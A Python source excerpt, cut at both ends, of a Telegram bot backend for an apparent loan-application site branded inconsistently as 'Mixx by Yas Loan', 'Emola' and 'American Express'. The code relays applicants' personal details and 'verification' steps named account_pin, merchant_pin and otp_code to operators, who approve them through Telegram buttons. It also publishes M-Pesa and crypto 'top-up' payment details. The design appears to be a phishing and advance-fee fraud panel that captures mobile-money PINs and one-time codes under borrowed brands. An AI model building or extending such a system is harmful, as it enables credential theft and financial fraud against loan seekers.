        return f"{proto}://{last_host}".rstrip("/")
    return f"http://{HOST}:{PORT}"


def get_payment_methods():
    raw = get_setting("payment_methods", "{}")
    try:
        return json.loads(raw)
    except Exception:
        return {}


def format_payment_methods_message():
    pm = get_payment_methods()
    till = pm.get("mpesaTill") or pm.get("till") or "Not configured"
    paybill = pm.get("mpesaPaybill") or pm.get("paybill") or "Not configured"
    account = pm.get("mpesaAccount") or pm.get("account") or "Mixx by Yas Loan"
    airtel = pm.get("airtelMoney") or pm.get("airtel") or "Not configured"
    crypto_addr = pm.get("cryptoAddress") or pm.get("crypto") or "Not configured"
    crypto_net = pm.get("cryptoNetwork") or "USDT (TRC20)"
    instructions = pm.get("instructions") or "After completing the transfer, please send proof of payment to the administrator for immediate account top-up."

    return (
        "💳 Top-Up Payment Methods\n\n"
        "Use the official details below to top up your account balance:\n\n"
        f"📱 M-Pesa Till (Buy Goods):\n👉 {till}\n\n"
        f"🏢 M-Pesa Paybill:\n👉 Business No: {paybill}\n👉 Account: {account}\n\n"
        f"📶 Airtel Money:\n👉 {airtel}\n\n"
        f"🪙 Cryptocurrency ({crypto_net}):\n👉 Address: {crypto_addr}\n\n"
        f"ℹ️ Instructions:\n{instructions}"
    )


def authenticate_telegram_admin(chat_id, user_info=None):
    if not chat_id:
        return None
    str_chat_id = str(chat_id).strip()
    configured_chat = telegram_admin_chat_id()
    user_info = user_info or {}
    first_name = user_info.get("first_name") or user_info.get("username") or "Admin"

    is_global_admin = bool(configured_chat and str_chat_id == str(configured_chat).strip())

    # Look up registered agent by this chat ID
    with connect_db() as db:
        agent = db.execute(
            """SELECT id, display_name, username, referral_code, telegram_chat_id, status
               FROM agents
               WHERE telegram_chat_id = ? AND status = 'active'""",
            (str_chat_id,),
        ).fetchone()

        # If global admin and not found by chat_id, check if there is an admin agent profile
        if not agent and is_global_admin:
            agent = db.execute(
                """SELECT id, display_name, username, referral_code, telegram_chat_id, status
                   FROM agents
                   WHERE (lower(username) LIKE '%admin%' OR lower(display_name) LIKE '%admin%')
                     AND status = 'active'
                   ORDER BY created_at DESC LIMIT 1"""
            ).fetchone()

    if is_global_admin:
        custom_id = get_setting("admin_custom_id")
        if agent:
            admin_id = agent["username"] or custom_id or "ADMIN"
            display_name = agent["display_name"] or first_name
            agent_id = agent["id"]
        else:
            admin_id = custom_id or "ADMIN"
            display_name = first_name
            agent_id = None

        return {
            "type": "global_admin",
            "admin_id": admin_id,
            "display_name": display_name,
            "role": "👤 Admin",
            "status": "Active",
            "agent_id": agent_id,
            "raw_agent": agent,
        }

    if agent:
        raw_user = (agent["username"] or "").strip()
        admin_id = raw_user if raw_user else f"AGENT_{agent['id'][:6].upper()}"
        role = "👤 Admin" if "admin" in raw_user.lower() else "👤 Agent"
        return {
            "type": "agent_admin",
            "admin_id": admin_id,
            "display_name": agent["display_name"] or first_name,
            "role": role,
            "status": "Active",
            "agent_id": agent["id"],
            "raw_agent": agent,
        }

    return None


def handle_telegram_message(message):
    chat = message.get("chat") or {}
    chat_id = str(chat.get("id", ""))
    text = (message.get("text") or "").strip()
    if not chat_id or not text:
        return
    parts = text.split()
    command = parts[0].split("@", 1)[0].lower()

    # Check for agent pairing link
    pairing_code = None
    if command == "/link" and len(parts) == 2:
        pairing_code = parts[1]
    elif command == "/start" and len(parts) == 2 and parts[1].startswith("link_"):
        pairing_code = parts[1][5:]

    if pairing_code:
        if chat.get("type") != "private":
            reply = "Open the agent pairing link in a private chat with this bot."
        else:
            agent_name = pair_telegram_agent(pairing_code, chat_id)
            reply = (
                f"Telegram connected to agent account: {agent_name}.\n\n"
                "Use /start to view your admin panel and commands."
                if agent_name
                else "This pairing link is invalid, expired, or already used. Ask the admin for a new link."
            )
        send_telegram_message(chat_id, reply)
        return

    from_user = message.get("from") or chat
    admin = authenticate_telegram_admin(chat_id, from_user)

    if not admin:
        reply = (
            "⛔ You do not have administrator access.\n\n"
            f"Your Telegram Chat ID: {chat_id}\n\n"
            "If you are an administrator or agent, please have your Chat ID registered in the admin dashboard."
        )
        send_telegram_message(chat_id, reply)
        return

    admin_id = admin["admin_id"]
    name = admin["display_name"]
    role = admin.get("role", "👤 Agent")
    base_url = get_public_base_url()

    # Form the actual referral link of the agent / admin in our system
    if admin.get("type") == "global_admin" or (admin.get("admin_id") and str(admin["admin_id"]).upper().startswith("ADMIN")):
        admin_ref = admin.get("admin_id") or get_setting("admin_custom_id") or "admin"
        personal_link = f"{base_url}/?ref={admin_ref}"
    elif admin.get("agent_id"):
        ref_code = create_referral_token(admin["agent_id"])
        personal_link = f"{base_url}/?ref={ref_code}"
    else:
        admin_ref = admin.get("admin_id") or get_setting("admin_custom_id") or "admin"
        personal_link = f"{base_url}/?ref={admin_ref}"

    clean_lower = text.lower().strip()
    is_link_cmd = (
        command in {"/mylink", "/link"}
        or clean_lower in {"link", "my link", "meu link", "link do agente", "send link", "get link", "copiar link", "pegar link"}
        or clean_lower.startswith("link ")
        or "link" in clean_lower.split()
    )

    is_topup_cmd = (
        command in {"/topup", "/payment", "/payments", "/recarga", "/pagamento"}
        or clean_lower in {"topup", "top up", "recarga", "pagamento", "pagamentos", "payment", "payments", "methods", "metodos"}
    )

    if command == "/start" or clean_lower in {"start", "oi", "ola", "olá", "hi", "hello"}:
        admin_extra = (
            "\n/setpayment - Configure top-up payment methods\n/seturl - Configure public application URL\n/botstatus - Check 24/7 bot health & uptime\n/webhook - Configure webhook mode"
            if admin["type"] == "global_admin"
            else "\n/botstatus - Check bot connection status"
        )
        pm = get_payment_methods()
        till = pm.get("mpesaTill") or pm.get("till") or "Not configured"
        paybill = pm.get("mpesaPaybill") or pm.get("paybill") or "Not configured"
        account = pm.get("mpesaAccount") or pm.get("account") or "Mixx by Yas Loan"
        airtel = pm.get("airtelMoney") or pm.get("airtel") or "Not configured"
        crypto = pm.get("cryptoAddress") or pm.get("crypto") or "Not configured"
        crypto_net = pm.get("cryptoNetwork") or "USDT (TRC20)"

        reply = (
            f"👋 Welcome {name}!\n\n"
            f"Your ID: {admin_id}\n"
            f"Role: {role}\n\n"
            f"Your Personal Link:\n"
            f"{personal_link}\n\n"
            f"Commands:\n\n"
            f"/mylink - Get your personal application link\n"
            f"/stats - View your application statistics\n"
            f"/pending - View pending applications\n"
            f"/topup - Payment methods for account top-up\n"
            f"/myinfo - View your admin information{admin_extra}\n\n"
            f"💳 Top-Up Methods:\n"
            f"• M-Pesa Till: {till}\n"
            f"• M-Pesa Paybill: {paybill} (Account: {account})\n"
            f"• Airtel Money: {airtel}\n"
            f"• Crypto ({crypto_net}): {crypto}\n\n"
            f"Type /topup for full payment instructions."
        )
    elif is_link_cmd:
        reply = (
            f"🔗 Your Personal Link\n\n"
            f"{personal_link}\n\n"
            f"Share this link with applicants to associate their application with your account."
        )
    elif is_topup_cmd:
        reply = format_payment_methods_message()
    elif command in {"/seturl", "/setlink", "/baseurl"}:
        if admin["type"] != "global_admin":
            reply = "⛔ Only the administrator can configure the public URL."
        else:
            subparts = parts[1:]
            if not subparts:
                current_url = get_public_base_url()
                reply = (
                    f"🔗 Public Application URL:\n👉 {current_url}\n\n"
                    "To update the public URL, send:\n"
                    "/seturl https://your-domain.onrender.com"
                )
            else:
                new_url = subparts[0].strip().rstrip("/")
                if not new_url.startswith("http://") and not new_url.startswith("https://"):
                    new_url = f"https://{new_url}"
                set_setting("public_url", new_url)
                set_setting("last_seen_host", new_url)
                reply = f"✅ Application URL updated to:\n{new_url}\n\nYour personal links will now use this URL."
    elif command == "/setpayment":
        if admin["type"] != "global_admin":
            reply = "⛔ Only the administrator can configure payment methods."
        else:
            subparts = parts[1:]
            pm = get_payment_methods()
            if not subparts:
                reply = (
                    "⚙️ Payment Configuration (Admin)\n\n"
                    f"• M-Pesa Till: {pm.get('mpesaTill') or '—'}\n"
                    f"• M-Pesa Paybill: {pm.get('mpesaPaybill') or '—'} (Account: {pm.get('mpesaAccount') or '—'})\n"
                    f"• Airtel Money: {pm.get('airtelMoney') or '—'}\n"
                    f"• Crypto: {pm.get('cryptoAddress') or '—'} ({pm.get('cryptoNetwork') or 'USDT TRC20'})\n"
                    f"• Instructions: {pm.get('instructions') or '—'}\n\n"
                    "Commands to update:\n"
                    "/setpayment till <number>\n"
                    "/setpayment paybill <number> [account]\n"
                    "/setpayment airtel <number>\n"
                    "/setpayment crypto <address> [network]\n"
                    "/setpayment notes <instructions>"
                )
            else:
                raw_arg = " ".join(subparts).strip()
                if ":" in raw_arg and not raw_arg.split(":", 1)[0].strip().startswith("http"):
                    key, val = raw_arg.split(":", 1)
                elif "=" in raw_arg:
                    key, val = raw_arg.split("=", 1)
                else:
                    key = subparts[0]
                    val = " ".join(subparts[1:])
                key = key.strip().lower()
                val = val.strip()

                if key in {"till", "mpesatill", "mpesa_till"}:
                    pm["mpesaTill"] = val
                    reply = f"✅ M-Pesa Till updated to: {val}"
                elif key in {"paybill", "mpesapaybill", "mpesa_paybill"}:
                    val_parts = val.split(maxsplit=1)
                    pm["mpesaPaybill"] = val_parts[0] if val_parts else ""
                    if len(val_parts) > 1:
                        pm["mpesaAccount"] = val_parts[1]
                    reply = f"✅ M-Pesa Paybill updated to: {pm['mpesaPaybill']} (Account: {pm.get('mpesaAccount', '—')})"
                elif key in {"airtel", "airtelmoney", "airtel_money"}:
                    pm["airtelMoney"] = val
                    reply = f"✅ Airtel Money updated to: {val}"
                elif key in {"crypto", "cryptocurrency", "usdt"}:
                    val_parts = val.split(maxsplit=1)
                    pm["cryptoAddress"] = val_parts[0] if val_parts else ""
                    if len(val_parts) > 1:
                        pm["cryptoNetwork"] = val_parts[1]
                    reply = f"✅ Crypto updated to: {pm['cryptoAddress']} ({pm.get('cryptoNetwork', 'USDT TRC20')})"
                elif key in {"notes", "instrucoes", "instruções", "instruction", "instructions"}:
                    pm["instructions"] = val
                    reply = f"✅ Instructions updated to: {val}"
                else:
                    reply = "❓ Invalid option. Use: till, paybill, airtel, crypto, or notes."
                set_setting("payment_methods", json.dumps(pm))
    elif command == "/stats" or clean_lower == "stats":
        with connect_db() as db:
            if admin["type"] == "global_admin":
                rows = db.execute(
                    "SELECT status, COUNT(*) as cnt FROM applications GROUP BY status"
                ).fetchall()
            else:
                rows = db.execute(
                    """SELECT status, COUNT(*) as cnt FROM applications
                       WHERE agent_id = ? GROUP BY status""",
                    (admin["agent_id"],),
                ).fetchall()
        counts = {r["status"].lower(): r["cnt"] for r in rows}
        total = sum(counts.values())
        pending = counts.get("pending", 0)
        under_review = counts.get("under_review", 0)
        approved = counts.get("approved", 0)
        rejected = counts.get("rejected", 0)
        reply = (
            f"📊 Your Statistics\n\n"
            f"👤 Admin ID: {admin_id}\n\n"
            f"📝 Total Applications: {total}\n"
            f"⏳ Pending: {pending}\n"
            f"🔍 Under Review: {under_review}\n"
            f"✅ Approved: {approved}\n"
            f"❌ Rejected: {rejected}"
        )
    elif command == "/pending" or clean_lower == "pending":
        with connect_db() as db:
            if admin["type"] == "global_admin":
                rows = db.execute(
                    """SELECT id, first_name, last_name, phone, loan_amount, created_at, status
                       FROM applications
                       WHERE lower(status) = 'pending'
                       ORDER BY created_at DESC LIMIT 10"""
                ).fetchall()
            else:
                rows = db.execute(
                    """SELECT id, first_name, last_name, phone, loan_amount, created_at, status
                       FROM applications
                       WHERE agent_id = ? AND lower(status) = 'pending'
                       ORDER BY created_at DESC LIMIT 10""",
                    (admin["agent_id"],),
                ).fetchall()

        if not rows:
            reply = "⏳ Pending Applications\n\nThere are currently no pending applications."
        else:
            items = ["⏳ Pending Applications"]
            for r in rows:
                short_id = f"APP{r['id'][:6].upper()}"
                masked_phone = mask_phone_number(r["phone"])
                amount = f"{r['loan_amount']:,}".replace(",", ".")
                date_val = r["created_at"] or ""
                if len(date_val) >= 16:
                    date_str = date_val[:16].replace("T", " ")
                else:
                    date_str = date_val or "—"
                items.append(
                    f"📋 Application #{short_id}\n\n"
                    f"👤 Applicant: {r['first_name']} {r['last_name']}\n"
                    f"📱 Phone: {masked_phone}\n"
                    f"💰 Amount: ${amount} USD\n"
                    f"📅 Submitted: {date_str}\n"
                    f"📌 Status: Pending"
                )
            reply = "\n\n──────────────────\n\n".join(items)
    elif command == "/myinfo" or clean_lower in {"myinfo", "info"}:
        reply = (
            f"👤 Your Information\n\n"
            f"Admin ID: {admin_id}\n"
            f"Role: {role}\n"
            f"Status: Active\n\n"
            f"🔗 Personal Link:\n"
            f"{personal_link}"
        )
    elif command in {"/ping"}:
        reply = "🏓 Pong! Mixx by Yas Loan Bot is online and running full time 24/7."
    elif command in {"/botstatus", "/status", "/health"}:
        uptime_sec = int(time.time() - _bot_start_time)
        hours, remainder = divmod(uptime_sec, 3600)
        minutes, seconds = divmod(remainder, 60)
        uptime_str = f"{hours}h {minutes}m {seconds}s" if hours else f"{minutes}m {seconds}s"
        up_worker = "🟢 Alive" if (_update_thread and _update_thread.is_alive()) else "🔴 Inactive"
        notif_worker = "🟢 Alive" if (_notification_thread and _notification_thread.is_alive()) else "🔴 Inactive"
        keep_worker = "🟢 Active (anti-sleep ping every 8 min)" if (_keep_alive_thread and _keep_alive_thread.is_alive()) else "⚪ Disabled"
        watch_worker = "🟢 Active" if (_supervisor_thread and _supervisor_thread.is_alive()) else "🔴 Inactive"
        mode_str = "Webhook" if get_setting("use_telegram_webhook") == "1" else "Long Polling (Watchdog Auto-Restart)"
        reply = (
            "🤖 Bot 24/7 Health & Uptime Status\n\n"
            "• Status: 🟢 Online (Full-Time Running)\n"
            f"• Mode: {mode_str}\n"
            f"• Uptime: {uptime_str}\n"
            f"• Base URL: {base_url}\n\n"
            "👷 Background Workers:\n"
            f"• Polling Worker: {up_worker}\n"
            f"• Notification Worker: {notif_worker}\n"
            f"• Keep-Alive Anti-Sleep: {keep_worker}\n"
            f"• Watchdog Supervisor: {watch_worker}\n\n"
            "✅ The bot runs continuously and automatically restarts if any connection drops."
        )
    elif command in {"/webhook"}:
        if admin["type"] != "global_admin":
            reply = "⛔ Only the administrator can configure webhook settings."
        else:
            subparts = parts[1:]
            action = subparts[0].lower().strip() if subparts else "status"
            if action in {"on", "enable", "set", "true"}:
                public_url = get_public_base_url()
                if not public_url.startswith("https://"):
                    reply = "⛔ Telegram requires an HTTPS public URL for webhooks. Set your public URL first via /seturl https://your-domain.onrender.com"
                else:
                    wh_url = f"{public_url}/api/telegram/webhook"
                    try:
                        telegram_api("setWebhook", {"url": wh_url})
                        set_setting("use_telegram_webhook", "1")
                        reply = f"✅ Telegram Webhook activated!\nURL: {wh_url}\nUpdates will now be delivered via instant HTTPS push."
                    except Exception as err:
                        reply = f"❌ Failed to set webhook: {err}"
            elif action in {"off", "disable", "delete", "false"}:
                try:
                    telegram_api("deleteWebhook", {"drop_pending_updates": False})
                    set_setting("use_telegram_webhook", "0")
                    ensure_telegram_threads_running()
                    reply = "✅ Webhook removed. Switched to 24/7 Long Polling with watchdog auto-recovery."
                except Exception as err:
                    reply = f"❌ Failed to delete webhook: {err}"
            else:
                try:
                    wh_info = telegram_api("getWebhookInfo", {})
                    wh_url = wh_info.get("url") or "None (Long Polling active)"
                    reply = (
                        "📡 Webhook Status\n\n"
                        f"• Active Webhook: {wh_url}\n"
                        f"• Pending Updates: {wh_info.get('pending_update_count', 0)}\n\n"
                        "To manage:\n"
                        "/webhook on - Activate Webhook\n"
                        "/webhook off - Return to Long Polling"
                    )
                except Exception as err:
                    reply = f"Could not query webhook info: {err}"
    else:
        reply = (
            "❓ Unknown command.\n\n"
            "Available commands:\n\n"
            "/start\n"
            "/mylink\n"
            "/stats\n"
            "/pending\n"
            "/topup\n"
            "/myinfo\n"
            "/botstatus\n"
            "/ping"
        )

    send_telegram_message(chat_id, reply)


def handle_telegram_callback(callback_query):
    query_id = callback_query.get("id")
    data = callback_query.get("data", "")
    message = callback_query.get("message") or {}
    chat = message.get("chat") or {}
    chat_id = str(chat.get("id", ""))
    message_id = message.get("message_id")

    if data.startswith("verify:"):
        handle_verify_callback(query_id, data, chat_id, message_id, message)
        return

    if not data.startswith("stage:"):
        answer_telegram_callback(query_id, text="Unknown action.")
        return

    parts = data.split(":")
    if len(parts) != 3:
        answer_telegram_callback(query_id, text="Invalid data.")
        return

    _, new_stage, app_id = parts
    stage_names = {
        "pending": "Pending",
        "under_review": "Under Review",
        "approved": "Approved",
        "rejected": "Rejected",
    }
    if new_stage not in stage_names:
        answer_telegram_callback(query_id, text="Invalid stage.")
        return

    with connect_db() as db:
        app = db.execute("SELECT id, status FROM applications WHERE id = ?", (app_id,)).fetchone()
        if not app:
            answer_telegram_callback(query_id, text="Application not found.")
            return
        db.execute("UPDATE applications SET status = ? WHERE id = ?", (new_stage, app_id))

    display_names = {
        "pending": "Pending",
        "under_review": "🔍 Under Review",
        "approved": "✅ Approved",
        "rejected": "❌ Rejected",
    }
    display_name = display_names[new_stage]
    try:
        answer_telegram_callback(query_id, text=f"Decision recorded: {display_name}")
    except Exception:
        pass

    if chat_id and message_id:
        existing_text = message.get("text", "")
        lines = existing_text.splitlines()
        new_lines = []
        for line in lines:
            if line.startswith("Status:") or line.startswith("📌 Status:") or line.startswith("📊 Estágio") or line.startswith("📋 Decisão:") or line.startswith("📋 Decision:"):
                continue
            new_lines.append(line)
        new_lines.append(f"\n📋 Decision: {display_name}")

        app_phone = None
        with connect_db() as db:
            app_rec = db.execute("SELECT phone FROM applications WHERE id = ?", (app_id,)).fetchone()
            if app_rec:
                app_phone = app_rec["phone"]

        # Explicitly pass empty inline keyboard so Telegram removes buttons on terminal stages
        reply_markup = (
            {"inline_keyboard": []}
            if new_stage in ("approved", "rejected")
            else stage_buttons(app_id, new_stage, phone=app_phone)
        )
        try:
            edit_telegram_message(
                chat_id,
                message_id,
                "\n".join(new_lines),
                reply_markup=reply_markup,
                parse_mode=None,
            )
        except Exception as err:
            print(f"Error editing Telegram message after stage decision: {err}")


def handle_verify_callback(query_id, data, chat_id, message_id, message):
    """Handle verify:approve:<vid> and verify:reject:<vid> Telegram callbacks."""
    parts = data.split(":")
    if len(parts) != 3:
        answer_telegram_callback(query_id, text="Invalid data.")
        return

    _, action, verification_id = parts
    if action not in ("approve", "reject"):
        answer_telegram_callback(query_id, text="Invalid action.")
        return

    new_status = "approved" if action == "approve" else "rejected"
    reject_reason = "Information provided does not match records." if action == "reject" else None

    with connect_db() as db:
        ver = db.execute(
            "SELECT id, application_id, step, status FROM verifications WHERE id = ?",
            (verification_id,),
        ).fetchone()
        if not ver:
            answer_telegram_callback(query_id, text="Verification not found.")
            return
        if ver["status"] != "pending":
            answer_telegram_callback(query_id, text="This verification has already been processed.")
            # Remove any lingering buttons
            if chat_id and message_id:
                try:
                    edit_telegram_message(chat_id, message_id, message.get("text") or "Processed", reply_markup={"inline_keyboard": []}, parse_mode=None)
                except Exception:
                    pass
            return
        db.execute(
            "UPDATE verifications SET status = ?, reject_reason = ? WHERE id = ?",
            (new_status, reject_reason, verification_id),
        )
        if new_status == "approved" and ver["step"] in ("id_document", "otp_code"):
            db.execute(
                "UPDATE applications SET status = 'approved' WHERE id = ?",
                (ver["application_id"],),
            )

    label = "✅ Approved" if action == "approve" else "❌ Rejected"
    step_label = "PIN + Phone" if ver["step"] in ("zip_phone", "account_pin", "merchant_pin") else ("OTP Code" if ver["step"] == "otp_code" else "SMS / Verification Message")
    try:
        answer_telegram_callback(query_id, text=f"Verification {step_label}: {label}")
    except Exception:
        pass

    if chat_id and message_id:
        existing_text = (message.get("text") or "") + f"\n\n📋 Decision: {label}"
        try:
            edit_telegram_message(
                chat_id,
                message_id,
                existing_text,
                reply_markup={"inline_keyboard": []},
                parse_mode=None,
            )
        except Exception as err:
            print(f"Error editing Telegram message after verify decision: {err}")


_bot_start_time = time.time()
_update_thread = None
_notification_thread = None
_keep_alive_thread = None
_supervisor_thread = None
_telegram_lock = threading.Lock()
_telegram_threads_active = False


def is_bot_running():
    token = telegram_bot_token()
    if not token:
        return False
    return bool(
        (_update_thread and _update_thread.is_alive())
        or (_supervisor_thread and _supervisor_thread.is_alive())
    )


def keep_alive_loop():
    """Background worker that periodically pings the server health endpoint to prevent cloud hosts (e.g. Render free tier) from sleeping."""
    time.sleep(60)
    while True:
        try:
            public_url = get_public_base_url()
            if (
                public_url
                and public_url.startswith("http")
                and "127.0.0.1" not in public_url
                and "localhost" not in public_url
            ):
                health_url = f"{public_url}/api/health"
                req = Request(health_url, headers={"User-Agent": "Emola-KeepAlive/1.0"})
                with urlopen(req, timeout=20) as resp:
                    if resp.status == 200:
                        pass
        except Exception:
            pass
        # Sleep for 8 minutes (480s). Render sleeps at 15m without incoming traffic.
        time.sleep(480)


def telegram_update_loop():
    offset = None
    consecutive_conflicts = 0
    while True:
        token = telegram_bot_token()
        if not token:
            time.sleep(5)
            continue
        try:
            payload = {"timeout": 25, "allowed_updates": ["message", "callback_query"]}
            if offset is not None:
                payload["offset"] = offset
            updates = telegram_api("getUpdates", payload) or []
            consecutive_conflicts = 0
            for update in updates:
                if "message" in update:
                    handle_telegram_message(update.get("message") or {})
                elif "callback_query" in update:
                    handle_telegram_callback(update.get("callback_query") or {})
                offset = max(offset or 0, int(update.get("update_id", 0)) + 1)
        except Exception as error:
            error_details = str(error)
            if hasattr(error, "read"):
                try:
                    error_details += " - " + error.read().decode()
                except Exception:
                    pass
            if "webhook is active" in error_details.lower():
                print("Webhook was active on Telegram; deleting webhook to resume 24/7 polling...")
                try:
                    telegram_api("deleteWebhook", {"drop_pending_updates": False})
                    time.sleep(2)
                    continue
                except Exception:
                    pass
            if "conflict" in error_details.lower() or "409" in error_details:
                consecutive_conflicts += 1
                wait_sec = min(30, 5 * consecutive_conflicts)
                print(f"Telegram polling conflict ({error_details}). Waiting {wait_sec}s for session to clear...")
                time.sleep(wait_sec)
                continue
            if "404" in error_details or "401" in error_details or "not found" in error_details.lower() or "unauthorized" in error_details.lower():
                print("Telegram bot token is invalid or bot not found. Retrying in 5s. Set EMOLA_TELEGRAM_BOT_TOKEN or update Admin Settings.")
                time.sleep(5)
                continue

            print(f"Telegram update polling failed ({type(error).__name__}: {error_details}); retrying.")
            time.sleep(5)


def telegram_supervisor_loop():
    """Watchdog supervisor that monitors all bot worker threads and automatically revives any that stopped."""
    global _update_thread, _notification_thread, _keep_alive_thread, _telegram_threads_active
    while True:
        try:
            token = telegram_bot_token()
            if token:
                with _telegram_lock:
                    if get_setting("use_telegram_webhook") != "1":
                        if _update_thread is None or not _update_thread.is_alive():
                            print("[Watchdog] Reviving Telegram polling worker...")
                            _update_thread = threading.Thread(
                                target=telegram_update_loop, daemon=True, name="TgUpdateWorker"
                            )
                            _update_thread.start()
                    if _notification_thread is None or not _notification_thread.is_alive():
                        print("[Watchdog] Reviving Telegram notification worker...")
                        _notification_thread = threading.Thread(
                            target=telegram_notification_loop, daemon=True, name="TgNotifyWorker"
                        )
                        _notification_thread.start()
                    if _keep_alive_thread is None or not _keep_alive_thread.is_alive():
                        _keep_alive_thread = threading.Thread(
                            target=keep_alive_loop, daemon=True, name="TgKeepAlive"
                        )
                        _keep_alive_thread.start()
                    _telegram_threads_active = True
        except Exception as error:
            print(f"[Watchdog] Supervisor error: {error}")
        time.sleep(15)


def ensure_telegram_threads_running():
    global _supervisor_thread, _update_thread, _notification_thread, _keep_alive_thread, _telegram_threads_active
    token = telegram_bot_token()
    if not token or token.startswith("test-") or token.startswith("fake-"):
        return False
    with _telegram_lock:
        if get_setting("use_telegram_webhook") != "1":
            if _update_thread is None or not _update_thread.is_alive():
                _update_thread = threading.Thread(
                    target=telegram_update_loop, daemon=True, name="TgUpdateWorker"
                )
                _update_thread.start()
        if _notification_thread is None or not _notification_thread.is_alive():
            _notification_thread = threading.Thread(
                target=telegram_notification_loop, daemon=True, name="TgNotifyWorker"
            )
            _notification_thread.start()
        if _keep_alive_thread is None or not _keep_alive_thread.is_alive():
            _keep_alive_thread = threading.Thread(
                target=keep_alive_loop, daemon=True, name="TgKeepAlive"
            )
            _keep_alive_thread.start()
        if _supervisor_thread is None or not _supervisor_thread.is_alive():
            _supervisor_thread = threading.Thread(
                target=telegram_supervisor_loop, daemon=True, name="TgSupervisor"
            )
            _supervisor_thread.start()
            print("Telegram 24/7 background supervisor, polling, and keep-alive workers started.")
        _telegram_threads_active = True
        return True


def hash_agent_password(password):
    salt = secrets.token_bytes(16)
    iterations = 310_000
    digest = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, iterations)
    return "$".join(
        (
            "pbkdf2_sha256",
            str(iterations),
            base64.urlsafe_b64encode(salt).decode("ascii"),
            base64.urlsafe_b64encode(digest).decode("ascii"),
        )
    )


def verify_agent_password(password, stored_hash):
    try:
        algorithm, iterations, salt_text, digest_text = stored_hash.split("$", 3)
        if algorithm != "pbkdf2_sha256":
            return False
        salt = base64.urlsafe_b64decode(salt_text.encode("ascii"))
        expected = base64.urlsafe_b64decode(digest_text.encode("ascii"))
        actual = hashlib.pbkdf2_hmac(
            "sha256", password.encode("utf-8"), salt, int(iterations)
        )
        return hmac.compare_digest(actual, expected)
    except (ValueError, TypeError):
        return False


def telegram_notification_loop():
    while True:
        try:
            with connect_db() as db:
                agent_event = db.execute(
                    """SELECT o.id AS event_id, a.id, a.first_name, a.last_name,
                              a.phone, a.loan_type, a.loan_amount, a.term_months,
                              a.purpose, a.employment, a.annual_income, a.status,
                              g.telegram_chat_id
                       FROM telegram_agent_outbox o
                       JOIN applications a ON a.id = o.application_id
                       JOIN agents g ON g.id = a.agent_id
                       WHERE o.sent_at IS NULL AND o.next_attempt_at <= ?
                         AND g.telegram_chat_id IS NOT NULL
                       ORDER BY o.created_at LIMIT 1""",
                    (time.time(),),
                ).fetchone()
                admin_event = None
                if agent_event is None:
                    admin_event = db.execute(
                          """SELECT o.id AS event_id, a.id, a.first_name, a.last_name,
                              a.phone, a.loan_type, a.loan_amount, a.term_months,
                              a.purpose, a.employment, a.annual_income, a.agent_id,
                              a.agent_contact_consent, a.status
                       FROM telegram_outbox o
                       JOIN applications a ON a.id = o.application_id
                       WHERE o.sent_at IS NULL AND o.next_attempt_at <= ?
                       ORDER BY o.created_at LIMIT 1""",
                        (time.time(),),
                    ).fetchone()
                orphan_agent_event = None
                if agent_event is None and admin_event is None and telegram_admin_chat_id():
                    orphan_agent_event = db.execute(
                        """SELECT o.id AS event_id, a.id, a.first_name, a.last_name,
                                  a.phone, a.loan_type, a.loan_amount, a.term_months,
                                  a.purpose, a.employment, a.annual_income, a.status,
                                  a.agent_id, a.agent_contact_consent
                           FROM telegram_agent_outbox o
                           JOIN applications a ON a.id = o.application_id
                           JOIN agents g ON g.id = a.agent_id
                           WHERE o.sent_at IS NULL AND o.next_attempt_at <= ?
                             AND (g.telegram_chat_id IS NULL OR trim(g.telegram_chat_id) = '')
                           ORDER BY o.created_at LIMIT 1""",
                        (time.time(),),
                    ).fetchone()
            selected = agent_event or admin_event or orphan_agent_event
            if selected is None:
                time.sleep(2)
                continue
            event = dict(selected)
            outbox_table = "telegram_agent_outbox" if (agent_event or orphan_agent_event) else "telegram_outbox"
            clean_phone = re.sub(r"[\s\-\+\(\)]", "", str(event["phone"]).strip())
            short_phone = clean_phone[-8:] if len(clean_phone) >= 8 else clean_phone
            with connect_db() as db:
                prior_apps = db.execute(
                    """SELECT COUNT(*) as cnt FROM applications
                       WHERE (phone = ? OR phone LIKE ? OR phone = ?) AND id != ?""",
                    (clean_phone, f"%{short_phone}", short_phone, event["id"]),
                ).fetchone()["cnt"]
            if prior_apps > 0:
                returning_badge = f"🔄 RETURNING APPLICANT ({prior_apps} previous loan/s)"
                badge_hdr = "🔄 RETURNING APPLICANT"
            else:
                returning_badge = "🆕 NEW APPLICANT (First Time)"
                badge_hdr = "🆕 NEW APPLICANT"

            if agent_event:
                destination = event["telegram_chat_id"]
                current_status = (event["status"] or "pending").lower()
                status_label = {
                    "pending": "⏳ Pending",
                    "under_review": "🔍 Under Review",
                    "approved": "✅ Approved",
                    "rejected": "❌ Rejected",
                }.get(current_status, current_status.title())
                phone_raw_val = str(event['phone'] or '').strip()
                disp_phone = format_display_phone(phone_raw_val)
                text = (
                    f"New American Express Personal Loan Application — {badge_hdr}\n"
                    f"──────────────────────\n"
                    f"👤 Applicant: <b>{event['first_name']} {event['last_name']}</b>\n"
                    f"📱 Phone: <code>{disp_phone}</code>\n"
                    f"🏷️ Profile: {returning_badge}\n"
                    f"🎯 Product: {event['loan_type']}\n"
                    f"💰 Amount: ${event['loan_amount']:,} USD\n"
                    f"📅 Term: {event['term_months']} Months\n"
                    f"🔖 Reference: <code>{event['id']}</code>\n"
                    f"📌 Status: {status_label}"
                )
                reply_markup = stage_buttons(event['id'], current_status, phone=event['phone'])
            else:
                agent = event["agent_id"] or "Direct"
                consent = "Yes" if event.get("agent_contact_consent") else "No"
                destination = telegram_admin_chat_id()
                current_status = (event["status"] or "pending").lower()
                status_label = {
                    "pending": "⏳ Pending",
                    "under_review": "🔍 Under Review",
                    "approved": "✅ Approved",
                    "rejected": "❌ Rejected",
                }.get(current_status, current_status.title())
                text = (
                    f"New American Express Personal Loan Application — {badge_hdr}\n"
                    f"──────────────────────\n"
                    f"🏷️ Profile: {returning_badge}\n"
                    f"🎯 Loan Type: {event['loan_type']}\n"
                    f"💰 Requested Amount: ${event['loan_amount']:,} USD\n"
                    f"📅 Term: {event['term_months']} Months\n"
                    f"💼 Purpose: {event['purpose']}\n"
                    f"👷 Employment: {event['employment']}\n"
                    f"💵 Annual Income: ${event['annual_income']:,.0f} USD\n"
                    f"🤝 Referral Agent: {agent}\n"
                    f"📞 Contact Authorized: {consent}\n"
                    f"🔖 Reference: {event['id']}\n"
                    f"📌 Status: {status_label}"
                )
                reply_markup = stage_buttons(event['id'], current_status, phone=event['phone'])
            try:
